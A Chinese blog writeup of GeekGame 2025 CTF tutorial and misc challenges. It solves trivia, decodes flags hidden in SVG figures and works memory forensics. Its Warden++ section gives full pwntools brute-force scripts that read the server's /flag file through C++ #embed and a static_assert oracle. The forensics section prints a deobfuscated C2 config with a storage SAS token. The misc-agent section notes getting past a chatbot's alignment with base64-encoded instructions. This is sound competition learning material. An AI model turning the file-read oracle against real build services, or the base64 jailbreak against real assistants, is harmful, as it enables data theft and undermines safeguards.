---
title: 'Geekgame 2025 Writeup -- Tutorial & Misc'
description: 'LLM的大胜利！'
publishDate: 2025-10-26 06:03:14
tags:
  - Technology
  - Life
  - Game
author: StatInfer

---

# Tutorial

## 签到 tutorial-signin

![](<tutorial-signin.gif>)
本来以为每一个码都是一样的，遂截图扫码，发现只有一部分内容。
![](<Pasted_image_20251025150936.png>)
于是用`Photoshop`打开，发现
![](<Pasted_image_20251025151014.png>)
剩下那个简单拉一下曲线就行
![](<Pasted_image_20251025151159.png>)

## 北清问答 / tutorial-trivia

### Prob.1 

![](<Pasted_image_20251025151410.png>)
然后：
![](<Pasted_image_20251025151426.png>)
求和得到`2822`

### Prob. 2

![](<Pasted_image_20251025151530.png>)
由于是新知识，LLM基本都答不上来，一阶段遂放弃。
二阶段提示后，查阅文档[Landmarks: Building an app with Liquid Glass | Apple Developer Documentation](<https://developer.apple.com/documentation/swiftui/landmarks-building-an-app-with-liquid-glass>)可知是 [`backgroundExtensionEffect()`](<https://developer.apple.com/documentation/swiftui/view/backgroundextensioneffect%5C%28%5C>))不过答案没有`()`

### Prob. 3

![](<Pasted_image_20251025152106.png>)
![](<Pasted_image_20251025152115.png>)
![](<Pasted_image_20251025152125.png>)
![](<Pasted_image_20251025152157.png>)
![](<Pasted_image_20251025152209.png>)
![](<Pasted_image_20251025152220.png>)
![](<Pasted_image_20251025152236.png>)
遂`11K`

### Prob. 4

翻阅源码[use libsodium to sign tokens · PKU-GeekGame/gs-backend@bcd71d3](<https://github.com/PKU-GeekGame/gs-backend/commit/bcd71d39d5de573e8d3bda0a2d4ba6e523f9cbfa>)
发现~~彩蛋~~
![](<Pasted_image_20251025152534.png>)

发现新旧代码分别是
```python

# ------- Old -------

def sign_token(sk: SigningKey, uid: int) -> str:
    assert uid>=0
    encoded = struct.pack('<Q', int(uid)).rstrip(b'\x00')
    sig = sk.sign(encoded, encoder=URLSafeBase64Encoder).decode()
    return f'GgT-{sig}'

# ------- New -------

def sign_token(uid: int) -> str:
    sig = base64.urlsafe_b64encode(secret.TOKEN_SIGNING_KEY.sign(
        str(uid).encode(),
        ec.ECDSA(hashes.SHA256()),
    )).decode()
    return f'{uid}:{sig}'
```

一阶段AI给的答案是错误的，遂放弃
![](<Pasted_image_20251025152859.png>)
二阶段![](<Pasted_image_20251025152913.png>)

```python
import base64
import struct
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
import nacl.signing
from nacl.encoding import URLSafeBase64Encoder

# --- 新版算法 (使用 libsodium/pynacl) ---

def sign_token_new(sk: nacl.signing.SigningKey, uid: int) -> str:
    """
    使用新版算法生成 Token。
    签名算法: Ed25519 (libsodium 默认)
    UID 编码: 8字节小端序无符号整数，并移除末尾的空字节
    """
    assert uid >= 0
    # 将 UID 打包成一个8字节的小端序无符号长整型 (unsigned long long)
    # 然后移除所有末尾的空字节，以缩短签名原文
    encoded = struct.pack('<Q', int(uid)).rstrip(b'\x00')
    
    # 使用 Ed25519 签名，并用 URL-safe Base64 编码 (无填充)
    sig = sk.sign(encoded, encoder=URLSafeBase64Encoder).decode('ascii')
    
    return f'GgT-{sig}'


# --- 旧版算法 (使用 cryptography) ---

def sign_token_old(signing_key: ec.EllipticCurvePrivateKey, uid: int) -> str:
    """
    使用旧版算法生成 Token。
    签名算法: ECDSA with SHA256
    UID 编码: 直接使用字符串形式
    """
    # 对 UID 的字符串形式进行签名
    raw_sig = signing_key.sign(
        str(uid).encode('utf-8'),
        ec.ECDSA(hashes.SHA256())
    )
    
    # 将签名结果用 URL-safe Base64 编码
    sig = base64.urlsafe_b64encode(raw_sig).decode('ascii')
    
    return f'{uid}:{sig}'


# --- 主程序 ---

if __name__ == "__main__":
    USER_ID = 1234567890

    print("--- 正在为 UID '{}' 生成 Token ---\n".format(USER_ID))

    # 1. 生成新版 Token
    # 为演示目的，我们随机生成一个 Ed25519 签名密钥
    # 在实际应用中，这个密钥应该是固定且保密的
    new_signing_key = nacl.signing.SigningKey.generate()
    new_token = sign_token_new(new_signing_key, USER_ID)
    
    print("新版算法:")
    print(f"  - Token: {new_token}")
    print(f"  - 长度: {len(new_token)} 字符\n")


    # 2. 生成旧版 Token
    # 为演示目的，我们随机生成一个 ECDSA 私钥 (使用 SECP256R1 曲线)
    # 在实际应用中，这个密钥也应该是固定且保密的
    old_private_key = ec.generate_private_key(ec.SECP256R1())
    old_token = sign_token_old(old_private_key, USER_ID)

    print("旧版算法:")
    print(f"  - Token: {old_token}")
    print(f"  - 长度: {len(old_token)} 字符\n")
    
    # 3. 计算长度差
    length_difference = len(old_token) - len(new_token)
    print("--- 结论 ---")
    print(f"新版 Token 比旧版缩短了: {length_difference} 个字符")
```

```markdown
--- 正在为 UID '1234567890' 生成 Token ---
新版算法:
  - Token: GgT-Nf5fFNALhNB9v1ZaUovDWx5cD-cutd7ZqUThn9OVahtksYrLG8oT1AzQhYx5VjPM6vGLi7MnqbBuIvtEVFeiAtIClkk=
  - 长度: 96 字符

旧版算法:
  - Token: 1234567890:MEUCIDF39tOOboUQWJTkU4ZNNcbXS5fzaLT-UScs1-4Xe8ZaAiEAx8obUsV42d-B2mHwYKGAWzn4mlNPoiBF2FyBg3Ew8v0=
  - 长度: 107 字符

--- 结论 ---
新版 Token 比旧版缩短了: 11 个字符
```

### Prob. 5

模糊印象里就是67开始有一个关于扩展程序的大变化，于是一遍直接猜对
当然后续翻文档也找到了。
![](<Pasted_image_20251025153317.png>)

### Prob. 6

一阶段直接放弃。
二阶段提示Netron
先打开文件，发现无法搜索无法直接统计Conv![](<Pasted_image_20251025154243.png>)

于是导出svg之后`Ctrl + F`
![](<Pasted_image_20251025154325.png>)

# Misc

## 别样的人机大战 / misc-agent

考虑用base64指令，绕过对齐
![](<Pasted_image_20251025154718.png>)
flag2同理。可能需要多发送几次，有概率拿到有概率拿不到

## Warden++ / misc-wardenpp

尽管已经知道了需要用到`#embed`但是作为一个合格的萌新，让我自己摸索写代码显然是不可能的（笑
![](<Pasted_image_20251025160718.png>)
写的第一遍的代码稍微有点问题，稍微de一下bug，代码如下，注意读了12个字节后服务器就会关闭，改一下范围之后继续运行就行。一共39个字节
 ```python
import string
from pwn import *

# --- 配置服务器信息 ---

HOST = 'prob07.geekgame.pku.edu.cn'
PORT = 10007
TOKEN = "GgT-DypCdeA6krEihbEAULw7IMgB_lP27QlQvO5rYEyAe-wDo-5cV1anse8AshkUBWSkh_Blyskoa46zQ-ECDCqoCjIH"

# --- C++ Payload 模板 ---

# 逻辑不变：利用 #embed 读取文件，利用 static_assert 进行编译期判断

CPP_PAYLOAD_TEMPLATE = """
#include <array>

// C++23 的 #embed 指令，在编译期读取文件
// 注意：必须是 "/flag" 来指定绝对路径
static constexpr unsigned char flag_data[] = {{
#embed "/flag"
}};

template<int INDEX, char CHAR_GUESS>
void check_char() {{
    // 编译期断言：如果我们的猜测正确，编译就会成功
    static_assert(flag_data[INDEX] == CHAR_GUESS, "Wrong guess");
}}

int main() {{
    // 调用模板函数，Python会替换这里的 index 和 char_guess
    check_char<{index}, '{char_guess}'>(); 
    return 0;
}}
END
"""

def solve():
    """
    主解题函数
    """
    flag = ""
    # 我们要猜测的字符集
    charset = string.ascii_letters + string.digits + string.punctuation + " "

    # 1. 建立一次持久连接
    # context.log_level = 'debug' # 取消注释以查看详细的 pwntools 交互日志
    p = remote(HOST, PORT)

    try:
        # 2. 完成一次性的初始化/握手
        log.info("正在连接服务器并发送 Token...")
        p.recvuntil(b'token:')
        p.sendline(TOKEN.encode())
        p.recvuntil(b'P.S Flag is at /flag on the server :)\n')
        log.success("服务器已就绪，开始爆破 Flag...")

        # 3. 在单次连接中循环爆破
        # 假设 flag 不会超过 100 个字符
        for i in range(100):
            found_char_at_pos = False
            for char in charset:
                # C++ 中有些字符需要转义，比如 ' 和 \
                escaped_char = char.replace('\\', '\\\\').replace("'", "\\'")

                # 格式化 C++ 代码，填入我们当前的猜测
                payload = CPP_PAYLOAD_TEMPLATE.format(index=i, char_guess=escaped_char)
                
                log.info(f"正在尝试第 {i} 位, 猜测字符: '{char}'")
                
                # 发送我们的 C++ 代码
                p.sendline(payload.encode())

                # 接收服务器的编译结果。我们读到 '!' 就知道一条响应结束了。
                # 设置一个超时以防万一
                response = p.recvuntil(b'!', timeout=5)

                # 判断编译是否成功
                if b"Success" in response:
                    flag += char
                    # 使用 pwntools 的 log 功能高亮显示
                    log.success(f"找到字符: '{char}'")
                    log.success(f"当前 Flag: {flag}")
                    found_char_at_pos = True
                    response = p.recvuntil(b'!', timeout=5)
                    break # 找到当前位的字符了，跳出内层循环，去猜下一位
            
            # 如果在一个位置上，试完了所有字符都没找到，说明 flag 可能已经结束了
            if not found_char_at_pos:
                log.warning("在当前位置没有找到匹配的字符，Flag 很可能已经完整。")
                break
                
            # 很多 flag 都以 '}' 结尾，这是一个很好的结束标志
            if flag.endswith('}'):
                log.success("Flag 包含 '}'，看起来已经完整了！")
                break

    except Exception as e:
        log.error(f"在爆破过程中发生错误: {e}")
    finally:
        # 4. 所有操作完成后关闭连接
        p.close()

    print("\n" + "="*40)
    print(f"[最终找到的 Flag]: {flag}")
    print("="*40)


if __name__ == "__main__":
    solve()
```
赛后再给一个多线程版本，虽然但是只能同时开3个线程（）
```python
import string
import threading
from pwn import *

# --- 配置服务器信息 ---

HOST = 'prob07.geekgame.pku.edu.cn'
PORT = 10007
TOKEN = "GgT-DypCdeA6krEihbEAULw7IMgB_lP27QlQvO5rYEyAe-wDo-5cV1anse8AshkUBWSkh_Blyskoa46zQ-ECDCqoCjIH"

# --- C++ Payload 模板 (保持不变) ---

CPP_PAYLOAD_TEMPLATE = """
#include <array>

static constexpr unsigned char flag_data[] = {{
#embed "/flag"
}};

template<int INDEX, char CHAR_GUESS>
void check_char() {{
    static_assert(flag_data[INDEX] == CHAR_GUESS, "Wrong guess");
}}

int main() {{
    check_char<{index}, '{char_guess}'>(); 
    return 0;
}}
END
"""

# --- 全局变量 ---

# 用于存放所有线程找到的字符 {index: char}

found_chars = {}

# 线程锁，用于保护对 found_chars 的写入操作

lock = threading.Lock()

# 要猜测的字符集

CHARSET = string.ascii_letters + string.digits + string.punctuation + " "

def guess_range(thread_id, start_index, end_index):
    """
    线程工作函数，负责猜测指定范围内的 Flag 字符。
    
    Args:
        thread_id (int): 线程的ID，用于日志区分。
        start_index (int): 猜测的起始字节索引。
        end_index (int): 猜测的结束字节索引（不包含）。
    """
    # 1. 每个线程建立自己的连接
    log.info(f"[线程 {thread_id}] 正在连接服务器...")
    for attemp in range(6):
        try:
            # context.log_level = 'debug' # 如果需要调试单个线程，可以取消注释
            p = remote(HOST, PORT)
            p.recvuntil(b'token:')
            p.sendline(TOKEN.encode())
            p.recvuntil(b'P.S Flag is at /flag on the server :)\n')
            log.success(f"[线程 {thread_id}] 连接成功，开始爆破范围 [{start_index}, {end_index-1}]")
            break
        except Exception as e:
            log.critical(f"[线程 {thread_id}] 连接失败: {e}，30s后重试")
            sleep(30)

    try:
        # 2. 在自己的连接上循环爆破分配到的范围
        for i in range(start_index, end_index):
            found_char_at_pos = False
            for char in CHARSET:
                # C++ 中有些字符需要转义
                escaped_char = char.replace('\\', '\\\\').replace("'", "\\'")
                payload = CPP_PAYLOAD_TEMPLATE.format(index=i, char_guess=escaped_char)
                
                # 发送 payload
                p.sendline(payload.encode())

                # 接收服务器的编译结果
                response = p.recvuntil(b'!', timeout=10)

                # 判断编译是否成功
                if b"Success" in response:
                    # --- 关键部分：使用锁保护共享数据 ---
                    with lock:
                        found_chars[i] = char
                    
                    log.success(f"[线程 {thread_id}] 在位置 {i} 找到字符: '{char}'")
                    found_char_at_pos = True
                    
                    # 消费掉结尾的 '!' 和换行符，准备下一次交互
                    p.recvuntil(b'!', timeout=5) 
                    break # 找到当前位的字符，跳出内层循环

            # 如果在一个位置上试完了所有字符都没找到，说明 flag 可能已经结束了
            if not found_char_at_pos:
                log.warning(f"[线程 {thread_id}] 在位置 {i} 未找到字符，该线程提前结束。")
                break
                
    except Exception as e:
        log.error(f"[线程 {thread_id}] 在爆破过程中发生错误: {e}")
    finally:
        # 3. 操作完成，关闭自己的连接
        p.close()
        log.info(f"[线程 {thread_id}] 任务完成，断开连接。")


def solve_multithreaded():
    """
    主函数，负责创建和管理线程。
    """
    threads = []
    
    # --- 配置线程参数 ---
    # 你可以根据需要调整线程数量和每个线程负责的字节数
    # 例如，4个线程，每个负责12个字节，总共爆破 4 * 12 = 48 个字节
    num_threads = 4 
    chunk_size = 10 # 每个线程负责的字节数

    log.info(f"启动 {num_threads} 个线程, 每个线程负责 {chunk_size} 个字节...")

    # 创建并启动线程
    for i in range(num_threads):
        start = i * chunk_size
        end = start + chunk_size
        thread = threading.Thread(
            target=guess_range, 
            args=(i + 1, start, end) # 线程ID从1开始
        )
        threads.append(thread)
        thread.start()
        # 短暂延时，避免瞬间向服务器建立大量连接
        time.sleep(0.1) 

    # 等待所有线程执行完毕
    for thread in threads:
        thread.join()

    # --- 组装最终结果 ---
    if not found_chars:
        log.error("所有线程均未找到任何字符，请检查配置和网络。")
        return

    # 从字典中按 key (也就是索引) 排序并拼接成字符串
    sorted_keys = sorted(found_chars.keys())
    final_flag = "".join(found_chars[key] for key in sorted_keys)
    
    print("\n" + "="*40)
    log.success(f"最终找到的 Flag: {final_flag}")
    print("="*40)


if __name__ == "__main__":
    solve_multithreaded()
```

## 开源论文太少了！ / misc-paper

直接打开PDF发现卡死了![](<Pasted_image_20251025164500.png>)
`Illustrator`也打不开，不过我电脑上正好装了好几个能开pdf的软件，遂尝试`PDF24`
![](<Pasted_image_20251025164653.png>)
于是顺利获得了一个正常的PDF，再次用`Illustrator`打开，即可直接选中图片提取SVG。
然后再vibe一个解码svg获取相对长度计算flag的小工具即可
```python
import xml.etree.ElementTree as ET
import numpy as np
import re
def solve_flag1():
    tree = ET.parse('flag1.svg')
    root = tree.getroot()
    
    ns = {'svg': 'http://www.w3.org/2000/svg'}
    
    polyline = root.find(".//*[@class='cls-18']", ns)
    points_str = polyline.attrib['points']

    points = [float(p) for p in points_str.strip().split()]
    y_coords = np.array(points[1::2])

    known_prefix = "flag{"
    known_ascii = np.array([ord(c) for c in known_prefix])
    log_known_ascii = np.log(known_ascii)

    y_prefix = y_coords[:5]
    
    # Perform linear regression: y = m * log(ascii) + c
    A = np.vstack([log_known_ascii, np.ones(len(log_known_ascii))]).T
    m, c = np.linalg.lstsq(A, y_prefix, rcond=None)[0]

    # Now, apply the conversion to all y-coordinates
    # log(ascii) = (y - c) / m
    log_ascii_values = (y_coords - c) / m
    
    # ascii = exp(log_ascii_values)
    ascii_values = np.exp(log_ascii_values)
    
    reconstructed_flag = "".join([chr(int(round(val))) for val in ascii_values])
    
    print(f"Reconstructed flag1: {reconstructed_flag}")
def solve_flag2():
    tree = ET.parse('flag2.svg')
    root = tree.getroot()
    
    ns = {'svg': 'http://www.w3.org/2000/svg'}
    
    paths = root.findall(".//svg:path[@class='cls-67']", ns)
    
    coords = []
    for path in paths:
        d = path.attrib['d']
        match = re.match(r'M(\d+\.\d+),(\d+\.\d+)', d)
        if match:
            x = float(match.group(1))
            y = float(match.group(2))
            coords.append((x, y))

    x_values = sorted(list(set([c[0] for c in coords])))
    y_values = sorted(list(set([c[1] for c in coords])))

    x_map = {val: i for i, val in enumerate(x_values)}
    y_map = {val: 3 - i for i, val in enumerate(y_values)}

    nibbles = []
    for x, y in coords:
        x_scaled = x_map[x]
        y_scaled = y_map[y]
        nibble = y_scaled * 4 + x_scaled
        nibbles.append(nibble)

    hex_string = "".join([f'{n:x}' for n in nibbles])
    
    if len(hex_string) % 2 != 0:
        hex_string = '0' + hex_string

    flag = bytes.fromhex(hex_string).decode('ascii')
    
    print(f"Reconstructed flag2: {flag}")

if __name__ == "__main__":
    solve_flag1()
    solve_flag2()
```
```Output
Reconstructed flag1: flag{THeGoaLoFARtIFACTEvaLUaTionISTOawardBadgestOaRtiFactsoFACcEpTedpAPerS}
Reconstructed flag2: flag{\documentclass[sigconf,review,anonymous,screen]}
```

## 勒索病毒 / misc-ransomware

> [!fail]
> 受到附件问题影响连flag1都没拿到！

二阶段提示之后就很容易拿到flag1了，先用algo-gzip.py生成keystream再解密flag1-2-3.txt就行，但是错误的附件的flag恰好有一块内容不在前1079bytes！！
更新附件（赛后）很快拿到了flag1

## 取证大师 / misc-DFIR

agent做了很久也没做出来，以为很难
但是最后发现没有想象中的那么难
![](<Pasted_image_20251026020343.png>)
LLM起手，先用`Volatility`列一下进程列表（`vol -f mem.dmp windows.pslist.PsList`）找`Cursor.exe`的`pid`，发现
![](<Pasted_image_20251026020451.png>)
然后把这些都`vol -f mem.dmp windows.memmap.Memmap --pid [PID] --dump`dump下来
简单`strings [PID].dmp | grep -i "flag{"`发现只有`5964`这个进程内部有flag相关字符串。
遂提取`pid.5964.dmp`中`flag`附近的可读文本
于是得到了~~网易云音乐歌单~~：
![](<Pasted_image_20251026021245.png>)
其实是两端明显混淆过后的js
![](<Pasted_image_20251026021339.png>)
网上随便找了一个工具反混淆，得到
```javascript flag1.js
module.exports = {
  'storageAccount': "cursor00account7x2csd.blob.core.windows.net",
  'metaContainer': 'mzl80liqhujwg',
  'sasToken': "sv=2024-11-04&ss=bfqt&srt=sco&sp=rwdlacupiytfx&se=2025-10-16T07:38:42Z&st=2025-10-11T23:23:42Z&spr=https,http&sig=QLO28lK9MzdhtMcfz5T5MVLB0fE1R0WxInOA7Qowykg%3D",
  'p2pPort': 0xbb8,
  'mode': "egress",
  'flag': "flag{th1s_1s_4_am4z1ng_c2!}"
};
```
另一段反混淆之后太长了，懒得看
![](<Pasted_image_20251026021459.png>)
继续交给gemini老师![](<Pasted_image_20251026021546.png>)
发现是flag2的内容，继续先用`vol`扫一下`netscan`，找到服务器ip
![](<Pasted_image_20251026021630.png>)
`wireshark`打开`pcapng`文件，看到HTTP PUT，怀疑内容就是flag
![](<Pasted_image_20251026021823.png>)
![](<Pasted_image_20251026022027.png>)
发现有疑似base64编码的内容，解码出来发现是hex的字符串表示
继续求助AI，得知`key`和`IV`都写到`x-ms-meta`里了，AI直接给了我一个解密脚本
```python
from Crypto.Cipher import AES
import base64
import binascii

# The NEW Base64 ciphertext from the body of packet 64471

b64_ciphertext = "[PASTE THE NEW BASE64 STRING HERE]"

# The Key and IV remain the SAME as before

key_bytes = bytes([
    11, 30, 212, 80, 155, 78, 201, 54, 154, 140, 0, 167, 139, 74, 97, 174, 
    107, 3, 194, 239, 10, 162, 195, 230, 98, 121, 243, 119, 213, 127, 55, 240
])

iv_bytes = bytes([
    99, 2, 23, 231, 128, 137, 207, 127, 54, 195, 12, 118, 27, 165, 92, 19
])

# --- Decryption Logic ---

try:
    # Decode the Base64 string and then convert from hex to bytes
    ciphertext = binascii.unhexlify(base64.b64decode(b64_ciphertext))
    
    # Create the AES-256-CBC cipher
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)
    
    # Decrypt and remove padding
    decrypted_padded = cipher.decrypt(ciphertext)
    padding_len = decrypted_padded[-1]
    decrypted_flag = decrypted_padded[:-padding_len].decode('utf-8')
    
    print("🎉 Decryption Successful! 🎉")
    print(f"Your flag is: {decrypted_flag}")

except Exception as e:
    print(f"An error occurred: {e}")
```
依次对刚刚找到的base64的文本进行解码即可拿到flag
